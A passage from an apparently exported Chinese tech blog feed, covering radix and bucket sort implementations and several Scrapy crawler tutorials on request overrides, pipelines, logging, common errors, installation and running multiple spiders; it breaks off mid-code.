设置桶的默认数量为5</span></span><br><span class="line">    bucketSize = bucketSize || <span class="variable constant_">DEFAULT_BUCKET_SIZE</span>;</span><br><span class="line">    <span class="keyword">var</span> bucketCount = <span class="title class_">Math</span>.<span class="title function_">floor</span>((maxValue - minValue) / bucketSize) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> buckets = <span class="keyword">new</span> <span class="title class_">Array</span>(bucketCount);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; buckets.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        buckets[i] = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用映射函数将数据分配到各个桶中</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        buckets[<span class="title class_">Math</span>.<span class="title function_">floor</span>((arr[i] - minValue) / bucketSize)].<span class="title function_">push</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    arr.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; buckets.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">insertionSort</span>(buckets[i]);                     <span class="comment">// 对每个桶进行排序，这里使用了插入排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; buckets[i].<span class="property">length</span>; j++) &#123;</span><br><span class="line">            arr.<span class="title function_">push</span>(buckets[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10、基数排序（Radix-Sort）"><a href="#10、基数排序（Radix-Sort）" class="headerlink" title="10、基数排序（Radix Sort）"></a>10、基数排序（Radix Sort）</h3><p>基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。<br>有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。<br>最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。</p><h4 id="10-1-算法描述"><a href="#10-1-算法描述" class="headerlink" title="10.1 算法描述"></a>10.1 算法描述</h4><ol><li><p>取得数组中的最大数，并取得位数；</p></li><li><p>arr为原始数组，从最低位开始取每个位组成radix数组；</p></li><li><p>对radix进行计数排序（利用计数排序适用于小范围数的特点）；</p></li></ol><h4 id="10-2-动图演示"><a href="#10-2-动图演示" class="headerlink" title="10.2 动图演示"></a>10.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F.gif" alt="基数排序" title="基数排序"></p><h4 id="10-3-算法分析"><a href="#10-3-算法分析" class="headerlink" title="10.3 算法分析"></a>10.3 算法分析</h4><p>基数排序基于分别排序，分别收集，所以是稳定的。但基数排序的性能比桶排序要略差，<br>每一次关键字的桶分配都需要O(n)的时间复杂度，而且分配之后得到新的关键字序列又需要O(n)的时间复杂度。</p><p>假如待排数据可以分为d个关键字，则基数排序的时间复杂度将是O(d*2n)，当然d要远远小于n，因此基本上还是线性级别的。</p><p>基数排序的空间复杂度为O(n+k)，其中k为桶的数量。一般来说n&gt;&gt;k，因此额外空间需要大概n个左右。</p><ul><li><p>时间复杂度：O(kn)</p></li><li><p>空间复杂度：O(n+k)</p></li><li><p>稳定排序</p></li><li><p>非原地排序</p></li></ul><p>注：K表示临时数组的大小</p><h4 id="10-4-代码实现"><a href="#10-4-代码实现" class="headerlink" title="10.4 代码实现"></a>10.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">radix_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data:list</span></span><br><span class="line"><span class="string">    :return:sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="comment"># 最大位数</span></span><br><span class="line">    max_value = <span class="built_in">max</span>(data)</span><br><span class="line">    max_digit = <span class="built_in">str</span>(max_value).__len__()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将数据按照个位、十位、百位。。。上的数字放到对应编号的桶里</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_digit):</span><br><span class="line">        <span class="comment"># 初始化桶，因为每个位置数范围0-9，故初始化10个桶</span></span><br><span class="line">        buckets = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">            index = <span class="built_in">int</span>(d / (<span class="number">10</span> ** i) % <span class="number">10</span>)</span><br><span class="line">            buckets[index].append(d)</span><br><span class="line">        <span class="comment"># 从桶中按序取出数据放回原数组</span></span><br><span class="line">        data = [d <span class="keyword">for</span> b <span class="keyword">in</span> buckets <span class="keyword">for</span> d <span class="keyword">in</span> b]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = radix_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RadioSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] radioSort(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr == <span class="literal">null</span> || arr.length &lt; <span class="number">2</span>) <span class="keyword">return</span> arr;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 找出最大值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(max &lt; arr[i]) max = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 计算最大值是几位数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (max / <span class="number">10</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            num++;</span><br><span class="line">            max = max / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 创建10个桶</span></span><br><span class="line">        ArrayList&lt;LinkedList&lt;Integer&gt;&gt; bucketList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(<span class="number">10</span>);</span><br><span class="line">        <span class="comment">//初始化桶</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            bucketList.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 进行每一趟的排序，从个位数开始排</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= num; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="comment">// 获取每个数最后第 i 位是数组</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">radio</span> <span class="operator">=</span> (arr[j] / (<span class="type">int</span>)Math.pow(<span class="number">10</span>,i-<span class="number">1</span>)) % <span class="number">10</span>;</span><br><span class="line">                <span class="comment">//放进对应的桶里</span></span><br><span class="line">                bucketList.get(radio).add(arr[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//合并放回原数组</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (Integer t : bucketList.get(j)) &#123;</span><br><span class="line">                    arr[k++] = t;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//取出来合并了之后把桶清光数据</span></span><br><span class="line">                bucketList.get(j).clear();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">radixSort</span>(<span class="params">arr, maxDigit</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> mod = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> dev = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; maxDigit; i++, dev *= <span class="number">10</span>, mod *= <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr.<span class="property">length</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">var</span> bucket = <span class="built_in">parseInt</span>((arr[j] % mod) / dev);</span><br><span class="line">            <span class="keyword">if</span> (counter[bucket] == <span class="literal">null</span>) &#123;</span><br><span class="line">                counter[bucket] = [];</span><br><span class="line">            &#125;</span><br><span class="line">            counter[bucket].<span class="title function_">push</span>(arr[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; counter.<span class="property">length</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">var</span> value = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (counter[j] != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((value = counter[j].<span class="title function_">shift</span>()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    arr[pos++] = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No78：Scrapy重写start_requests方法</title>
      <link href="/posts/4cd8baef.html"/>
      <url>/posts/4cd8baef.html</url>
      
        <content type="html"><![CDATA[<p>有时scrapy默认的start_requests无法满足我们的需求，例如分页爬取，那就要对它进行重写，添加更多操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">start_requests</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="comment"># 自定义功能</span></span><br><span class="line">    <span class="keyword">yield</span> scrapy.Request(url=<span class="string">&quot;http://test.com&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, callback=<span class="variable language_">self</span>.parse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">    <span class="built_in">print</span>(response.url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No77：Scrapy管道的open_spider、close_spider</title>
      <link href="/posts/cb27dbe8.html"/>
      <url>/posts/cb27dbe8.html</url>
      
        <content type="html"><![CDATA[<p>pipelines.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DemoPipeline</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开启爬虫时执行，只执行一次</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        <span class="comment"># 为spider对象动态添加属性，可以在spider模块中获取该属性值</span></span><br><span class="line">        <span class="comment"># spider.hello = &quot;world&quot;</span></span><br><span class="line">        <span class="comment"># 可以开启数据库等</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 处理提取的数据(保存数据)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭爬虫时执行，只执行一次。</span></span><br><span class="line">    <span class="comment"># 如果爬虫中间发生异常导致崩溃，close_spider可能也不会执行</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        <span class="comment"># 可以关闭数据库等</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No76：Scrapy日志操作</title>
      <link href="/posts/4f9d888d.html"/>
      <url>/posts/4f9d888d.html</url>
      
        <content type="html"><![CDATA[<ul><li>logging设置</li></ul><p>通过在setting.py中进行以下设置可以被用来配置logging</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认: True，启用logging</span></span><br><span class="line">LOG_ENABLED = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认: &#x27;utf-8&#x27;，logging使用的编码</span></span><br><span class="line">LOG_ENCODING = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认: None，在当前目录里创建logging输出文件的文件名</span></span><br><span class="line">LOG_FILE = <span class="string">&quot;name.log&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认: &#x27;DEBUG&#x27;，log的最低级别</span></span><br><span class="line">LOG_LEVEL = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认: False 如果为 True，进程所有的标准输出(及错误)将会被重定向到log中。</span></span><br><span class="line"><span class="comment"># 例如，执行 print &quot;hello&quot; ，其将会在Scrapy log中显示。</span></span><br><span class="line">LOG_STDOUT = <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Scrapy提供5层logging级别</li></ul><p>CRITICAL - 严重错误(critical)</p><p>ERROR - 一般错误(regular errors)</p><p>WARNING - 警告信息(warning messages)</p><p>INFO - 一般信息(informational messages)</p><p>DEBUG - 调试信息(debugging messages)</p><ul><li>日志按日期记录并保存成文件</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前时间</span></span><br><span class="line">today = datetime.now()</span><br><span class="line"><span class="comment"># 日志文件按日期命名</span></span><br><span class="line">log_file_path = <span class="string">&quot;logs/log_&#123;&#125;_&#123;&#125;_&#123;&#125;.log&quot;</span>.<span class="built_in">format</span>(today.year, today.month, today.day)</span><br><span class="line"><span class="comment"># 日志输出级别</span></span><br><span class="line">LOG_LEVEL = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"><span class="comment"># 日志输出路径</span></span><br><span class="line">LOG_FILE = log_file_path</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No75：Scrapy常见问题汇总</title>
      <link href="/posts/678c9aae.html"/>
      <url>/posts/678c9aae.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、TimeoutError报错解决方法"><a href="#1、TimeoutError报错解决方法" class="headerlink" title="1、TimeoutError报错解决方法"></a>1、TimeoutError报错解决方法</h3><ul><li>问题描述</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># twisted.internet.error.TimeoutError: User timeout caused connection failure:</span></span><br></pre></td></tr></table></figure><p>一般是在全局配置settings.py中设置了DOWNLOAD_TIMEOUT，或用了代理IP等，就会出现这类报错。</p><ul><li>解决方法为</li></ul><p>在middleware中，捕获这个报错，并返回request，让他重新请求这个对象。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet.error <span class="keyword">import</span> TimeoutError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_exception</span>(<span class="params">self, request, exception, spider</span>):</span><br><span class="line">    <span class="comment"># Called when a download handler or a process_request()</span></span><br><span class="line">    <span class="comment"># (from other downloader middleware) raises an exception.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Must either:</span></span><br><span class="line">    <span class="comment"># - return None: continue processing this exception</span></span><br><span class="line">    <span class="comment"># - return a Response object: stops process_exception() chain</span></span><br><span class="line">    <span class="comment"># - return a Request object: stops process_exception() chain</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(exception, TimeoutError):</span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、scrapy里面item传递数据后数据不正确的问题"><a href="#2、scrapy里面item传递数据后数据不正确的问题" class="headerlink" title="2、scrapy里面item传递数据后数据不正确的问题"></a>2、scrapy里面item传递数据后数据不正确的问题</h3><p>按照理想状态，最后的item数据每个都是唯一的，但是实际情况是最后的item很多数据都是重复和错乱的，完全不对。</p><p>查找原因后，发现是因为使用Request函数传递item时，使用的是浅复制（对象的字段值被复制时，字段引用的对象不会被复制）。</p><p>解决方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="comment"># meta = &#123;&quot;item&quot;: item&#125;</span></span><br><span class="line">meta = &#123;<span class="string">&quot;item&quot;</span>: copy.deepcopy(item)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>按照这个方法，把几个Request里面的都改了，数据是正常了。</p><p>但是，还没完。</p><p>此时，如果打开Pipeline，再跑一遍查看数据，发现还是错乱的。</p><p>因为，最后yield item后，如果需要下载图片，Pipeline的get_media_requests方法需要参数item，通过item获取图片URL再去下载，如果是浅拷贝就有可能跟上面的情况一样。</p><p>解决方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="comment"># yield item</span></span><br><span class="line"><span class="keyword">yield</span> copy.deepcopy(item)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No74：Scrapy安装方法</title>
      <link href="/posts/472d23ac.html"/>
      <url>/posts/472d23ac.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、Ubuntu-16-04"><a href="#1、Ubuntu-16-04" class="headerlink" title="1、Ubuntu 16.04"></a>1、Ubuntu 16.04</h3><p>1.安装Scrapy依赖库</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3.6-dev</span><br><span class="line">sudo apt-get install libevent-dev</span><br><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><p>2.scarpy需求lxml，OpenSSL，Twisted库一般系统自带，也可用以下方法安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip install lxml</span><br><span class="line">sudo pip install pyOpenSSL</span><br><span class="line">sudo pip install Twisted</span><br></pre></td></tr></table></figure><p>3.安装Scrapy</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip install scrapy</span><br></pre></td></tr></table></figure><h3 id="2、Windows"><a href="#2、Windows" class="headerlink" title="2、Windows"></a>2、Windows</h3><p>1.更新pip</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>2.安装wheel</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>3.安装lxml</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip intsall lxml</span><br></pre></td></tr></table></figure><p>4.安装Twisted</p><p><a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted">下载地址</a></p><ul><li><p>下载Twisted-18.9.0-cp36-cp36m-win_amd64.whl(对应python和软件版本)</p></li><li><p>进入文件所在目录</p></li><li><p>安装</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install Twisted-18.9.0-cp36-cp36m-win_amd64.whl</span><br></pre></td></tr></table></figure><p>5.安装pywin32</p><p>方法一、离线包</p><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32">下载地址</a></p><ul><li><p>下载pywin32-224-cp36-cp36m-win_amd64.whl(对应python和软件版本)</p></li><li><p>进入文件所在目录</p></li><li><p>安装</p></li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install pywin32-224-cp36-cp36m-win_amd64.whl</span><br></pre></td></tr></table></figure><p>方法二、在线</p><p>通过PIP指向此软件包pypiwin32，从PYPI安装pywin32</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m pip install pypiwin32</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python -m意思是将库中的python模块用作脚本去运行</span></span><br></pre></td></tr></table></figure><p>6.安装scrapy</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install scrapy</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No73：Scrapy多个爬虫同时运行</title>
      <link href="/posts/35128224.html"/>
      <url>/posts/35128224.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、创建运行文件"><a href="#一、创建运行文件" class="headerlink" title="一、创建运行文件"></a>一、创建运行文件</h3><p>在spiders目录的同级目录下创建一个commands目录，并在该目录中创建一个crawlall.py，</p><p>将scrapy源代码里的commands文件夹里的crawl.py源码复制过来，只修改run()方法即可。（文件夹下面必须要有__init__文件）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> scrapy.commands <span class="keyword">import</span> ScrapyCommand</span><br><span class="line"><span class="keyword">from</span> scrapy.utils.conf <span class="keyword">import</span> arglist_to_dict</span><br><span class="line"><span class="keyword">from</span> scrapy.utils.python <span class="keyword">import</span> without_none_values</span><br><span class="line"><span class="keyword">from</span> scrapy.exceptions <span class="keyword">import</span> UsageError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>(<span class="title class_ inherited__">ScrapyCommand</span>):</span><br><span class="line">    requires_project = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">syntax</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[options] &lt;spider&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">short_desc</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Run all spider&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_options</span>(<span class="params">self, parser</span>):</span><br><span class="line">        ScrapyCommand.add_options(<span class="variable language_">self</span>, parser)</span><br><span class="line">        parser.add_option(</span><br><span class="line">                <span class="string">&quot;-a&quot;</span>,</span><br><span class="line">                dest=<span class="string">&quot;spargs&quot;</span>,</span><br><span class="line">                action=<span class="string">&quot;append&quot;</span>,</span><br><span class="line">                default=[],</span><br><span class="line">                metavar=<span class="string">&quot;NAME=VALUE&quot;</span>,</span><br><span class="line">                <span class="built_in">help</span>=<span class="string">&quot;set spider argument (may be repeated)&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">        parser.add_option(</span><br><span class="line">                <span class="string">&quot;-o&quot;</span>,</span><br><span class="line">                <span class="string">&quot;--output&quot;</span>,</span><br><span class="line">                metavar=<span class="string">&quot;FILE&quot;</span>,</span><br><span class="line">                <span class="built_in">help</span>=<span class="string">&quot;dump scraped items into FILE (use - for stdout)&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">        parser.add_option(</span><br><span class="line">                <span class="string">&quot;-t&quot;</span>,</span><br><span class="line">                <span class="string">&quot;--output-format&quot;</span>,</span><br><span class="line">                metavar=<span class="string">&quot;FORMAT&quot;</span>,</span><br><span class="line">                <span class="built_in">help</span>=<span class="string">&quot;format to use for dumping items with -o&quot;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_options</span>(<span class="params">self, args, opts</span>):</span><br><span class="line">        ScrapyCommand.process_options(<span class="variable language_">self</span>, args, opts)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            opts.spargs = arglist_to_dict(opts.spargs)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">raise</span> UsageError(<span class="string">&quot;Invalid -a value, use -a NAME=VALUE&quot;</span>, print_help=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> opts.output:</span><br><span class="line">            <span class="keyword">if</span> opts.output == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">                <span class="variable language_">self</span>.settings.<span class="built_in">set</span>(<span class="string">&quot;FEED_URI&quot;</span>, <span class="string">&quot;stdout:&quot;</span>, priority=<span class="string">&quot;cmdline&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.settings.<span class="built_in">set</span>(<span class="string">&quot;FEED_URI&quot;</span>, opts.output, priority=<span class="string">&quot;cmdline&quot;</span>)</span><br><span class="line">            feed_exporters = without_none_values(</span><br><span class="line">                    <span class="variable language_">self</span>.settings.getwithbase(<span class="string">&quot;FEED_EXPORTERS&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">            valid_output_formats = feed_exporters.keys()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> opts.output_format:</span><br><span class="line">                opts.output_format = os.path.splitext(opts.output)[<span class="number">1</span>].replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> opts.output_format <span class="keyword">not</span> <span class="keyword">in</span> valid_output_formats:</span><br><span class="line">                <span class="keyword">raise</span> UsageError(</span><br><span class="line">                        <span class="string">&quot;Unrecognized output format &#x27;%s&#x27;, set one&quot;</span></span><br><span class="line">                        <span class="string">&quot; using the &#x27;-t&#x27; switch or as a file extension&quot;</span></span><br><span class="line">                        <span class="string">&quot; from the supported list %s&quot;</span></span><br><span class="line">                        % (opts.output_format, <span class="built_in">tuple</span>(valid_output_formats))</span><br><span class="line">                )</span><br><span class="line">            <span class="variable language_">self</span>.settings.<span class="built_in">set</span>(<span class="string">&quot;FEED_FORMAT&quot;</span>, opts.output_format, priority=<span class="string">&quot;cmdline&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, args, opts</span>):</span><br><span class="line">        <span class="comment"># 获取爬虫列表</span></span><br><span class="line">        spd_loader_list = <span class="variable 